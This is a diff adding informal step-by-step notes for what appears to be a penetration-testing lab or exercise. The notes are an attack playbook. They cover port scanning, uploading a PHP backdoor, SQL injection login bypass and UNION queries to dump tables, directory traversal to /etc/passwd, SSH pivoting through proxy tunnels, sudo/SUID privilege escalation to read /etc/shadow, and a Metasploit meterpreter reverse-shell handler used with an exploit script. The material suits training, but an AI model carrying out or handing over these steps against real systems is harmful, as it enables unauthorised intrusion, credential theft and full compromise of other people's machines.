@@ -1,0 +1,113 @@
+LIN OPS-----------------------------------------------------------------------------------------------
+Nmap the given network to see what ports you are able to access
+
+If 80 is open nmap <IP> -Pn -T5 --script=banner ,http-enum.nse
+
+Note the Host names next to the Ip in the OP notes under that put the results of the scans
+Website------------------------------------------------------------------------------------------------
+Navigate to the website open all things that you can click on (enumerate the website)
+
+If there is no /uploads folder then ignore trying to upload the malicous file. there is a .php file (this file is in the FG its meant to open a backdoor on the system)
+
+Make sure to write down the credentials you find in the OP notes
+
+When you see the user name and password boxes its a post method (bob' or 1'=1)
+
+then open the inspection tab and go to network so you can capture the request, put the question mark behined the .php and put the raw request next to it on the lin ops its names webshell.php
+
+If it doesn't give you a proper format then inspect the page, this should show you the data, if credentials are hidden behined this make sure you decode them either ROT13 or base64 
+
+If you see FILE TO READ with a text box directory traversal, so you could do something like ../../../../../../../../../etc/hosts or ../../../../../../../etc/passwd
+
+Write down the collected information into the op notes 
+SSH------------------------------------------------------------
+Then using any credentials you gained ssh into the box to enumerate 
+
+Run a Ping sweep to find other targets to go to 
+
+Write the results of the ping sweep in the OP notes
+LIN OPS--------------------------
+open a MS and a dynaic port to use proxychains nmap to enumerate the machines you find
+
+write the results of the nmap scan into the OP notes
+
+Tunnel to all the ports you find open
+
+WEB APP -----------------------------------------------------------------------------------
+When you see buttons or an url that ends with php?word=<value> 
+
+you then change the value and add OR 1=1; tothe end EX. ?product=1 OR 1=1;
+
+the use union select 1,2,3; to find the number of collumns this can be extended if you belive there are more columns
+
+verify the order that it nees to be placed in sometimes 1,2,3 can be 1,3,2 so you would have to move around your golden statment in order to make sure that works
+
+************golden statment (union select table_schema,table_name,column_name from information_schema.columns) so if the order was swapped it would be (union select table_schema,column_name,table_name from information_schema.columns)
+
+ignore information_schema, mysql, and performacnce_schema at the bottom will be the user made ones
+
+if the table reads |siteusers|users|username| the sql injection will look like UNION SELECT username,2,3 from siteusers.users 
+
+write down any information you find in the OP notes
+
+Make a tunnel to the WEB APP so you are able to have access to your tools 
+
+SSH-------------------------------------------------------------------
+ping sweep 
+
+Write your findings in your OP Notes 
+
+Priviledge escilation sudo -l
+
+go to gtfobins find which ever the user can run to break out into a root shell 
+
+copy the command to escalate privledges 
+
+if thats not avaliable search for the SUID and GUIDS
+
+enumerate the root files and all other files root can only see like /etc/shadow or the /root directory
+
+Pivot to the other targets that you found during the earlier ping sweep
+
+LIN OPS ------------------------------------------------------------------------------
+
+Set up a dynaic tunnel to the machine that has access to the windows machine
+
+find the open ports
+
+bannergrab them with the nmap script frrom earlier
+
+find the secure server port for 
+
+set a tunnel to it possibly 9999 
+
+in the windowsdeb.py on lin ops, change the port to whatever port you set on your tunnel to the secure server
+
+(1) on your linops open a listening port
+(2) msfconsole
+(3) use exploit/multi/handler
+(4) set payload windows/meterpreter/reverse_tcp
+(5) set LHOST 0.0.0.0
+(6) set LPORT 10000 (or whatever port was used to generate the shell code
+(7) exploit
+(8) python ./windowsdeb.py
+
+this should open a system shell on the lin ops
+
+
+if one is the 3389 set a tunnel up to it so you can RDP to it
+
+xfreerdp /u:<username> /p:<password> /v:<loopback> /port:<the port set up on the tunnel to the RDP> /dynamic-resolution +glyth-cache +clipboard 
+
+
+
+
+
+
+
+
+
+
+
+
+
